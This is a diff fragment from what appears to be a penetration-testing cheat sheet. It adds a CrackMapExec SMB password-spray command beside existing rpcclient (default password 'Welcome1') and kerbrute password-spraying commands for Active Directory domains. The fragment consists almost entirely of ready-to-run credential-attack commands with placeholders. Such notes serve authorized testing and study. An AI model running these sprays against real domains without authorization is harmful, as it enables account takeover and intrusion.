@@ -1688,6 +1688,12 @@ $ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;
 $ kerbrute passwordspray -d <Domain Name> --dc <DC IP address> names.txt <password>
 ```
 
+- Crackmapexec Password Spray
+
+```
+$ sudo crackmapexec smb <IP address> -u names.txt -p <password> | grep +
+```
+
 - DomainPasswordSpray
 
 ```
